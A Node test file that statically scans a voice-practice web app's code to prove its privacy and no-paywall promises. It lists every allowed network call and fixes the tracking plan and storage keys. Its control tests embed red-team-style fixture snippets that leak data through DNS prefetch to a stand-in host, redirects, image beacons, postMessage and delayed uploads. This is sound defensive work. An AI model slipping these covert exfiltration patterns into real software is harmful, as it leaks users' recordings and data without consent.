// The copy's promises, read from the code. tests/marketing-claims.spec.js proves them for the visitors it plays,
// and the third red team (docs/48 section 11) showed what that cannot reach: 27 changes that broke a promise
// on a path no visitor there walks. A take uploaded when it is rated, when the clock runs out on its own, on
// a singing exercise, on the second save, on the third visit, two minutes later, by the account sync, to the
// window that opened the site, in a streamed body, over DNS; a cap on the routine's second step, on '+30 s',
// on the class and the goal sets, past a trial, in another time zone, on a phone, on a take with no microphone.
//
// A browser test can only walk paths. These read the code, so they hold on every path:
//
// 1. Every way off the device is written down here, function by function, with why it is there. A new one,
//    on any path, fails until somebody writes down why, and says why it cannot carry the voice.
// 2. Only the files that make a take can hear the voice or read a take, and in each of them no function that
//    does leads to one that sends.
// 3. Start, Stop, Continue, the routines, the rating, Next and '+30 s' never reach the pricing window, and
//    read the plan only in the functions listed, to draw Pro's own extras. A cap needs one or the other.
// 4. The plan is read only in the files listed, so a cap in a routine, a goal set or the engine shows here.
// 5. Every event's props are the ones in the plan below: js/analytics.js sends only what the worker keeps
//    (tests/node/analytics-wire.test.mjs), and this keeps a new prop on a known event from riding out.
// 6. No account needed: nothing on the way to practising, saving a take, rating it or looking back at the
//    history asks whether the visitor is signed in (but the header's label); the code that keeps a guest's
//    progress never asks, never keeps it for the tab only, and keeps it under the names it always has.
// 7. No ad during practice: only js/ads.js reads the ad config, so no toast or card elsewhere can carry an ad
//    past its practice gate, and it asks Google for nothing but the units it draws.
//
// What these do not do: see a sink spelt through a computed name, or follow a value handed between files by a
// variable. They are tripwires for honest changes, which is how the 27 were written; review is the rest.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { parse } from "espree";
import {
  acrossScripts,
  billingNamesIn,
  functionsOf,
  practicePath,
  reachable,
  shippedScripts,
  sinksIn,
  voiceSourcesIn
} from "../../qa/promise-scan.mjs";

/** Every way off the device: file → "function › kind" → [count, why]. */
export const EGRESS = {
  "js/account.js": {
    "request › fetch": [1, "every account call (sign-in, the progress sync, trial, licence): JSON to the worker, never a take"],
    "loadGoogleScript › createElement:script": [1, "Google's sign-in button, loaded when the account panel asks for it"],
    "loadGoogleScript › set:src": [1, "the same script's fixed address"]
  },
  "js/admin-layouts.js": {
    "load › VTAccount.request": [1, "the admin window's layout counts (GET)"],
    "loadGlance › VTAccount.request": [2, "the admin window's health and layout glance (GET)"]
  },
  "js/admin.js": { "api › VTAccount.request": [1, "the admin window's calls, for the owner's account only"] },
  "js/ads.js": {
    "renderNativeCard › window.open": [1, "a house ad's link, opened when it is clicked"],
    "renderAdSensePlaceholder › createElement:script": [1, "AdSense's script, outside practice and never for Pro"],
    "renderAdSensePlaceholder › set:src": [1, "the same script's fixed address"]
  },
  "js/analytics.js": {
    "flush › sendBeacon": [1, "events, as the worker keeps them (wireEvent), on the way out of the page"],
    "flush › fetch": [1, "the same events, batched"],
    "forget › fetch": [1, "the request to delete this browser's events"]
  },
  "js/app.js": {
    "renderTourInvite › set:href": [1, "a link to the guide"],
    "syncGuideLinks › set:href": [1, "links to the guide"],
    "syncGuideLinks › setAttribute:href": [1, "links to the guide"],
    "renderExercise › html:input": [1, "the exercise's own sliders, no address"],
    "showPlayback › html:audio": [1, "the take played back from its blob: address, on the device"],
    "renderMetricsForm › html:input": [2, "the rating form's fields, no address"],
    "bindHistoryList › createElement:audio": [1, "a saved take played back, on the device"],
    "bindHistoryList › set:src": [1, "its blob: address"],
    "bindHistoryList › html:audio": [2, "the saved takes' players"],
    "bindAccount › VTAccount.request": [2, "the owner's grants and gift codes, admin only"],
    "renderGiftCodes › VTAccount.request": [1, "the owner's gift codes (GET), admin only"],
    "renderFunnel › VTAccount.request": [1, "the owner's funnel (GET), admin only"],
    "renderAbResults › VTAccount.request": [2, "the owner's A/B results (GET), admin only"],
    "exportProgress › set:href": [2, "the progress file the visitor downloads, from a blob: address"]
  },
  "js/billing.js": {
    "openCustomerPortal › window.open": [1, "the payment provider's portal, when a subscriber asks for it"],
    "startCheckout › navigate": [1, "the checkout page, when a buyer presses buy"]
  },
  "js/boot-head.js": { "(top) › navigate": [1, "out of a frame another site put the page in"] },
  "js/frame-guard.js": { "(top) › navigate": [1, "out of a frame another site put the page in"] },
  "js/license.js": { "postJson › fetch": [1, "a licence key checked with the worker"] },
  "js/region-gate.js": {
    "askWorker › fetch": [1, "which country's consent rules apply, asked once"],
    "renderBar › setAttribute:href": [1, "the consent bar's link to the privacy page"]
  },
  "js/reminders.js": { "downloadIcs › set:href": [1, "the calendar file the visitor downloads, from a blob: address"] },
  "js/reports.js": {
    "mineSection › VTAccount.request": [1, "the visitor's own bug reports (GET)"],
    "send › VTAccount.request": [1, "a bug report the visitor typed and pressed send on"]
  },
  "js/scenes/guided.js": {
    "attach › new Audio": [1, "the take played back in the guided review, on the device"],
    "attach › set:src": [1, "its blob: address"]
  },
  "js/sync.js": {
    "readAccount › VTAccount.request": [1, "the signed-in visitor's progress, read from their account"],
    "runCycle › VTAccount.request": [1, "their progress (days, ratings, minutes) written to their account; takes stay (sync.js header)"],
    "flush › VTAccount.request": [1, "the same, on the way out of the page"]
  },
  "js/tour.js": { "render › set:href": [1, "a link to the guide"] }
};

/** The files that hear the voice or read a take, and what they use to. */
export const VOICE_FILES = {
  "js/app.js": ["getRecordingBlob", "listRecordings", "saveRecording"],
  "js/piano.js": ["MediaRecorder", "getFloatTimeDomainData", "getUserMedia"],
  "js/pitch-visualizer.js": ["createMediaStreamSource", "getFloatTimeDomainData", "getUserMedia"],
  "js/practice-engine.js": [
    "MediaRecorder",
    "createMediaStreamSource",
    "getByteFrequencyData",
    "getFloatTimeDomainData",
    "getUserMedia",
    "ondataavailable",
    "recBlob"
  ],
  "js/recorder.js": ["MediaRecorder", "createMediaStreamSource", "getByteTimeDomainData", "getUserMedia", "ondataavailable"],
  "js/storage.js": ["getRecordingBlob", "listRecordings", "saveRecording"]
};

/** Sinks that reach the network. An element's address and a player's blob: are left to the list above. */
const NETWORK = /› (fetch|sendBeacon|postMessage|window\.open|navigate|submit|cookie|share|VTAccount\.request|import\(\)|importScripts|serviceWorker\.register|hint|new (?!Audio$))/;

/** Where practice starts, goes on and ends, and where a take is saved and looked back at: the binders and what they call. */
export const PRACTICE_ROOTS = [
  "bindPracticeButtons",
  "bindRating",
  "bindReferenceCues",
  "renderNextStepCard",
  "renderStartPanel",
  "openPlanExercise",
  "startDaily",
  "startStructured",
  "advanceStructured",
  "openExercise",
  "forceOpenExercise",
  "startPractice",
  "continuePractice",
  "stopPractice",
  "startPlan",
  "runLiveTake",
  "startTimer",
  "recordPracticeIfDue",
  "stepDoneChoice",
  "completeExercise",
  "rateFeel",
  "leaveUnrated",
  "showPlayback",
  "renderHistory",
  "bindHistoryList"
];

/** The functions on that path that read the plan, what they read, and why: each draws, none stops practice. */
export const PLAN_READERS = {
  renderValuePulse: ["VTBilling:1 getEntitlement:1 trialDaysLeft:1", "the progress board's Pro panel and trial line"],
  headerPlanState: ["VTBilling:1 getEntitlement:1", "the header's plan label"],
  renderProGoalPicker: ["VTBilling:2", "Pro's goal picker, shown locked to a free visitor"],
  renderRetentionChrome: ["VTBilling:2 isPro:3", "the reminders card: Pro's second reminder"],
  renderReminderSettings: ["isPro:2", "the same card's second time field"],
  showValueMoment: ["VTBilling:1", "the note after a rated take about the trial"],
  valueMomentFor: ["getEntitlement:1 trialDaysLeft:2", "which note that is"],
  showValueBanner: ["trialDaysLeft:1", "the trial's days left on that note"],
  progressionKeysFor: ["VTBilling:1", "Pro's extra piano progressions, an extra on top of the exercise"]
};

/** The one function on that way that asks whether the visitor is signed in, and why. */
export const SIGN_IN_READERS = { headerPlanState: ["signedIn:1", "the header's plan label: Pro, trial, or signed in"] };

/** The files that ask whether the visitor is signed in, and why. */
export const SIGN_IN_FILES = {
  "js/account.js": "the account itself",
  "js/admin.js": "the owner's admin window",
  "js/app.js": "the account panel, the header and the checkout's need of an account",
  "js/billing.js": "a purchase tied to an account",
  "js/reports.js": "a bug report's own list, for a signed-in reporter",
  "js/sync.js": "the progress sync, which runs only for a signed-in visitor"
};

/** The files that keep a guest's progress: they never ask about an account and never keep anything for the tab only. */
export const GUEST_STORES = ["js/practice-days.js", "js/session.js", "js/storage.js"];
const NOT_IN_GUEST_STORES = /\b(sessionStorage|VTAccount|VTSync|signedIn|getSessionToken|openAccount)\b/g;

/**
 * The names a guest's progress is kept under. With no account there is nothing to restore it from, so renaming one
 * loses every visitor's history (the third red team bumped vt_progress_v1 to v2 unseen): read the old name and move it
 * over first, then change this list.
 */
export const GUEST_KEYS = {
  progress: "vt_progress_v1",
  session: "vt_session_v1",
  weekPlan: "vt_week_plan_v1",
  settings: "vt_settings_v1",
  reviews: "vt_reviews_v1",
  holdLogs: "vt_hold_logs_v1",
  profiles: "vt_profiles_v1",
  goals: "vt_goals_v1",
  achievements: "vt_achievements_v1",
  days: "vt_days_v1",
  loop: "vt_loop_v1",
  DB_NAME: "vt_recordings_db",
  DB_STORE: "recordings"
};

/** The files that may read the ad config or talk to AdSense. */
export const AD_FILES = ["js/ads-config.js", "js/ads.js"];
const AD_NAMES = /\b(VT_ADS_CONFIG|adsbygoogle|nativeCards)\b/;

/** The files that read the plan, and why. */
export const PLAN_FILES = {
  "js/ads.js": "no ads for Pro",
  "js/app.js": "the pricing window, the account panel, the Pro panels and the readers above",
  "js/auth.js": "the QA unlock of a test account",
  "js/billing.js": "the plan itself",
  "js/practice-days.js": "Pro's extra rest days for the streak",
  "js/reminders.js": "Pro's second reminder",
  "js/value-pulse.js": "the trial's days left on the progress board"
};

/** Every event and the props it may carry. `x_*` is app_open's re-asserted arms. */
export const TRACKING_PLAN = {
  account_panel_open: ["state"],
  ad_click: ["id", "mode", "slot"],
  ad_dismiss: ["id", "slot"],
  ad_impression: ["id", "mode", "slot"],
  ad_suppressed_practice: ["slot"],
  ad_suppressed_pro: ["slot"],
  ad_unfilled: ["mode", "slot", "status"],
  app_open: ["day", "loop", "...reassertedArms"],
  audio_compare: [],
  basics_complete: ["comeback", "first", "practiceDays", "practiced", "steps", "surprise", "tier", "track"],
  basics_incomplete: ["practiced", "steps", "tier", "track"],
  basics_start: ["sec", "steps", "tier", "track"],
  comeback: ["daysAway", "restBank"],
  experiment_expose: ["enabled", "experiment", "forced", "variant"],
  experiment_forced_view: ["enabled", "experiment", "variant"],
  first_track_pick: ["track"],
  first_win: ["exerciseId"],
  first_win_micro: [],
  layout_session: ["n", "src", "ver"],
  layout_switch: ["from", "sec", "to", "via"],
  layout_time: ["sec", "ver"],
  loop_cards_open: ["n"],
  loop_goal_set: ["goal"],
  loop_remind_click: [],
  loop_tier_pick: ["tier"],
  mic_blocked: ["canRun", "exerciseId"],
  "mic_primer_*": [],
  mic_primer_accept: [],
  mic_primer_show: [],
  milestone: ["n"],
  practice_day: ["n", "source", "structured"],
  practice_recorded: ["durationSec", "exerciseId", "firstOfDay", "micro", "source", "structured"],
  practice_start: ["exerciseId", "micro", "mode"],
  pro_paid_first: [],
  remind_due_shown: [],
  reminder_enable: ["enabled"],
  rest_used: ["days"],
  session_save: ["durationSec", "exerciseId", "feel", "firstWin", "score"],
  set_complete: ["practiced", "set", "steps", "track"],
  set_start: ["sec", "set", "steps", "track"],
  sets_open: ["n", "track"],
  signin_fail: ["method", "reason"],
  signin_start: ["method"],
  signin_success: ["method"],
  step_done_choice: ["choice", "exerciseId"],
  step_done_shown: ["exerciseId", "mic"],
  surprise_shown: ["id", "kind", "reason"],
  "tour_*": ["lastStepId", "n", "pack", "total"],
  tour_guide_open: ["pack", "stepId"],
  tour_invite_accept: [],
  tour_invite_dismiss: [],
  tour_start: ["authored", "fromButton", "pack", "steps", "variant"],
  tour_step: ["n", "pack", "stepId", "total"],
  trial_click: ["where"],
  trial_cta_view: ["where"],
  trial_first_practice: ["kind"],
  trial_result: ["kind", "outcome", "where"],
  trial_started: ["kind", "where"]
};

/** The functions that pass an event on without naming it: each module's own track(), and the funnel's. */
export const TRACK_RELAYS = ["js/ads.js › track", "js/app.js › trackFunnel", "js/daily-loop.js › track", "js/session-sets.js › track", "js/site-version.js › track", "js/tour.js › track"];

const TRACKERS = new Set(["track", "trackFunnel"]);

/** What a difference between two lists is, line by line, so a failure says what to write down. */
function diffCounts(found, expected) {
  const lines = [];
  for (const key of new Set([...Object.keys(found), ...Object.keys(expected)])) {
    if (found[key] !== expected[key]) lines.push(`${key}: found ${found[key] ?? 0}, written down ${expected[key] ?? 0}`);
  }
  return lines;
}

const flat = (bag) => Object.fromEntries(Object.entries(bag).flatMap(([file, rows]) => Object.entries(rows).map(([k, v]) => [`${file} :: ${k}`, v])));

/** The events a script raises: [where, name, props keys] for a literal call, and the relays that pass one on. */
export function eventsIn(source, file) {
  const found = { calls: [], relays: [] };
  const ast = parse(source, { ecmaVersion: "latest", sourceType: "script", loc: true });
  const visit = (node, owner) => {
    if (!node || typeof node.type !== "string") return;
    const here = /Function/.test(node.type) && node.id?.name ? node.id.name : owner;
    if (node.type === "CallExpression") eventCall(node, here, file, found);
    for (const v of Object.values(node)) {
      if (Array.isArray(v)) v.forEach((c) => visit(c, here));
      else if (v && typeof v.type === "string") visit(v, here);
    }
  };
  visit(ast, "(top)");
  return found;
}

function eventCall(node, owner, file, found) {
  const c = node.callee;
  const name = c.type === "MemberExpression" ? c.property.name : c.type === "Identifier" ? c.name : "";
  if (!TRACKERS.has(name)) return;
  const [ev, props] = node.arguments;
  const literal = ev?.type === "Literal" ? ev.value : ev?.type === "TemplateLiteral" ? ev.quasis[0].value.cooked + "*" : null;
  if (literal === null || (props && props.type !== "ObjectExpression")) {
    found.relays.push(`${file} › ${owner}`);
    return;
  }
  const keys = (props?.properties || []).map((p) => (p.type === "SpreadElement" ? "..." + (p.argument.callee?.name || "?") : (p.key.name ?? p.key.value)));
  found.calls.push([`${file}:${node.loc.start.line}`, literal, keys]);
}

test("every way off the device is written down, function by function, with why it is there", () => {
  const found = flat(acrossScripts(".", sinksIn));
  const expected = flat(Object.fromEntries(Object.entries(EGRESS).map(([f, rows]) => [f, Object.fromEntries(Object.entries(rows).map(([k, [n]]) => [k, n]))])));
  assert.deepEqual(
    diffCounts(found, expected),
    [],
    "a way off the device was added, moved or removed. Write it down in EGRESS with why it is there, and why it cannot carry the voice"
  );
});

test("only the files that make a take hear the voice or read a take", () => {
  const found = Object.fromEntries(Object.entries(acrossScripts(".", voiceSourcesIn)).map(([f, names]) => [f, Object.keys(names).sort()]));
  assert.deepEqual(found, VOICE_FILES);
});

test("in those files, nothing that hears the voice leads to anything that sends", () => {
  const leaks = [];
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    if (!VOICE_FILES[file]) continue;
    const fns = functionsOf(source);
    const hearers = Object.keys(fns).filter((n) => Object.keys(fns[n].voice).length);
    const reach = reachable(fns, hearers);
    for (const key of Object.keys(sinksIn(source)).filter((k) => NETWORK.test(k))) {
      const fn = key.split(" › ")[0];
      if (reach.has(fn)) leaks.push(`${file}: ${key}, reached by ${reach.get(fn).join(" > ")}`);
    }
  }
  assert.deepEqual(leaks, []);
});

test("Start, Stop, the routines, the rating, Next and '+30 s' never reach the sale, and read the plan only to draw", () => {
  const source = readFileSync("js/app.js", "utf8");
  const fns = functionsOf(source);
  assert.deepEqual(
    PRACTICE_ROOTS.filter((r) => !fns[r]),
    [],
    "control: every root is a function of js/app.js (a rename would empty the path)"
  );
  assert.ok(reachable(fns, PRACTICE_ROOTS).size > 150, "control: the path covers the practice code, not a stub of it");
  const path = practicePath(source, PRACTICE_ROOTS);
  for (const [name, { uses, via }] of Object.entries(path)) {
    assert.ok(!/openPricing|openAccount/.test(uses), `${name} opens the sale on the way to practice: ${via}`);
  }
  const found = Object.fromEntries(Object.entries(path).map(([n, { uses }]) => [n, uses]));
  const expected = Object.fromEntries(Object.entries(PLAN_READERS).map(([n, [uses]]) => [n, uses]));
  assert.deepEqual(
    diffCounts(found, expected),
    [],
    `the plan is read on the way to practice where it was not: ${JSON.stringify(Object.fromEntries(Object.entries(path).filter(([n]) => found[n] !== expected[n])), null, 1)}`
  );
});

test("the plan is read only in the files that sell, draw Pro or keep its extras", () => {
  assert.deepEqual(Object.keys(acrossScripts(".", billingNamesIn)).sort(), Object.keys(PLAN_FILES).sort());
});

test("every event carries only the props in the plan, and nothing passes one on but the listed relays", () => {
  const calls = [];
  const relays = [];
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    if (file === "js/analytics.js") continue;
    const found = eventsIn(source, file);
    calls.push(...found.calls);
    relays.push(...found.relays);
  }
  assert.ok(calls.length > 50, "control: the call sites are found");
  const off = calls.filter(([, name, keys]) => !TRACKING_PLAN[name] || keys.some((k) => !TRACKING_PLAN[name].includes(k)));
  assert.deepEqual(off, [], "an event or a prop not in TRACKING_PLAN: add it there, and say it is not derived from the voice");
  assert.deepEqual([...new Set(relays)].sort(), [...TRACK_RELAYS].sort());
});

test("nothing on the way to practising, saving, rating or the history asks whether the visitor is signed in, but the header", () => {
  const path = practicePath(readFileSync("js/app.js", "utf8"), PRACTICE_ROOTS, "account");
  const found = Object.fromEntries(Object.entries(path).map(([n, { uses }]) => [n, uses]));
  const expected = Object.fromEntries(Object.entries(SIGN_IN_READERS).map(([n, [uses]]) => [n, uses]));
  assert.deepEqual(diffCounts(found, expected), [], `asked on the way: ${JSON.stringify(path, null, 1)}`);
});

test("only the files listed ask whether the visitor is signed in", () => {
  const asks = (source) => {
    const n = {};
    for (const m of source.matchAll(/\b(signedIn|getSessionToken|openAccount)\b/g)) n[m[1]] = (n[m[1]] || 0) + 1;
    return n;
  };
  assert.deepEqual(Object.keys(acrossScripts(".", asks)).sort(), Object.keys(SIGN_IN_FILES).sort());
});

test("the code that keeps a guest's progress never asks about an account and never keeps anything for the tab only", () => {
  const scripts = shippedScripts(".");
  const found = GUEST_STORES.map((f) => [f, [...new Set([...scripts[f].matchAll(NOT_IN_GUEST_STORES)].map((m) => m[1]))]]).filter(([, n]) => n.length);
  assert.deepEqual(found, []);
});

test("a guest's progress is kept under the names it always was", () => {
  const src = readFileSync("js/storage.js", "utf8");
  const block = /const LS = \{([\s\S]*?)\n  \};/.exec(src)?.[1] || "";
  const keys = Object.fromEntries([...block.matchAll(/^\s*(\w+): "([^"]+)"/gm)].map((m) => [m[1], m[2]]));
  for (const name of ["DB_NAME", "DB_STORE"]) keys[name] = new RegExp(`const ${name} = "([^"]+)"`).exec(src)?.[1];
  assert.deepEqual(keys, GUEST_KEYS);
});

test("only js/ads.js reads the ad config, and it asks AdSense for nothing but the units it draws", () => {
  const readers = Object.entries(shippedScripts("."))
    .filter(([, src]) => AD_NAMES.test(src))
    .map(([f]) => f)
    .sort();
  assert.deepEqual(readers, AD_FILES);
  const pushes = [];
  const visit = (node) => {
    if (!node || typeof node.type !== "string") return;
    if (node.type === "CallExpression" && node.callee.type === "MemberExpression" && node.callee.property.name === "push") {
      const target = readFileSync("js/ads.js", "utf8").slice(node.callee.object.start, node.callee.object.end);
      if (/adsbygoogle/.test(target)) pushes.push(node.arguments.map((a) => (a.type === "ObjectExpression" ? a.properties.length : "?")).join(","));
    }
    for (const v of Object.values(node)) {
      if (Array.isArray(v)) v.forEach(visit);
      else if (v && typeof v.type === "string") visit(v);
    }
  };
  visit(parse(readFileSync("js/ads.js", "utf8"), { ecmaVersion: "latest", sourceType: "script", range: true }));
  assert.ok(pushes.length >= 1, "control: the unit's own push is found");
  assert.deepEqual([...new Set(pushes)], ["0"], "every push to adsbygoogle is an empty {}: a unit, never page-level or overlay ads");
});

/* ------------------------------------------------------------------ controls: each finder sees the red team's changes */

test("control: the sinks the red team used are each found, and a word that is not an address is not", () => {
  const src = `
    function save(b) { setTimeout(() => fetch("/api/grade", { method: "POST", body: b.stream(), duplex: "half" }), 10); }
    function hand(b) { window.opener?.postMessage({ b }, "*"); }
    function hint(h) { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//" + h + ".voice.example"; document.head.append(l); }
    function beacon(p) { navigator.sendBeacon("/v", p); }
    function img(d) { const i = new Image(); i.src = "/p?d=" + d; }
    function html(d) { el.innerHTML = '<img src="/p?d=' + d + '">'; }
    function cookie(p) { document.cookie = "t=" + p; }
    function go(d) { location.href = "https://x.example/?d=" + d; }
    function backup(t) { window.VTAccount.request("PUT", "/v1/me/takes", t); }
    function rtc() { new RTCPeerConnection(); new Worker("w.js"); }
    function word() { live.src = "chosen"; bag.src = x ? "default" : "link"; }
  `;
  assert.deepEqual({ ...sinksIn(src) }, {
    "save › fetch": 1,
    "hand › postMessage": 1,
    "hint › createElement:link": 1,
    "hint › hint": 1,
    "hint › set:href": 1,
    "beacon › sendBeacon": 1,
    "img › new Image": 1,
    "img › set:src": 1,
    "html › html:img": 1,
    "cookie › cookie": 1,
    "go › navigate": 1,
    "backup › VTAccount.request": 1,
    "rtc › new RTCPeerConnection": 1,
    "rtc › new Worker": 1
  });
});

test("control: a sync that reads a take, a helper that sends what a hearer hands it, and a cap behind a helper are caught", () => {
  assert.deepEqual(Object.keys(voiceSourcesIn("async function runCycle() { for (const r of await VTStorage.listRecordings()) put(r); }")), ["listRecordings"]);

  const app = `
    function onSave(result) { VTStorage.saveRecording(result.blob); later(result.blob); }
    function later(b) { setTimeout(() => upload(b), 120000); }
    function upload(b) { fetch("/api/backup", { method: "PUT", body: b }); }
    function startPractice() { if (capReached()) return; go(); }
    function capReached() { return !window.VTBilling?.isPro?.() && spent() > 3600; }
    function go() {}
  `;
  const fns = functionsOf(app);
  const reach = reachable(fns, ["onSave"]);
  assert.deepEqual(reach.get("upload"), ["onSave", "later", "upload"]);
  assert.match(Object.keys(sinksIn(app)).find((k) => NETWORK.test(k)), /^upload › fetch$/);
  assert.deepEqual(practicePath(app, ["startPractice"]), { capReached: { uses: "VTBilling:1 isPro:1", via: "startPractice > capReached" } });
});

test("control: a new prop on a known event, a new event and a new relay are each caught", () => {
  const src = `
    function recordPracticeIfDue() { window.VTAnalytics?.track?.("practice_recorded", { exerciseId: id, f0: contour }); }
    function shape() { window.VTAnalytics?.track?.("take_shape", { f0: contour }); }
    function relay(n, p) { window.VTAnalytics?.track?.(n, p); }
  `;
  const { calls, relays } = eventsIn(src, "x.js");
  const off = calls.filter(([, name, keys]) => !TRACKING_PLAN[name] || keys.some((k) => !TRACKING_PLAN[name].includes(k)));
  assert.deepEqual(
    off.map(([, n, k]) => [n, k]),
    [
      ["practice_recorded", ["exerciseId", "f0"]],
      ["take_shape", ["f0"]]
    ]
  );
  assert.deepEqual(relays, ["x.js › relay"]);
});
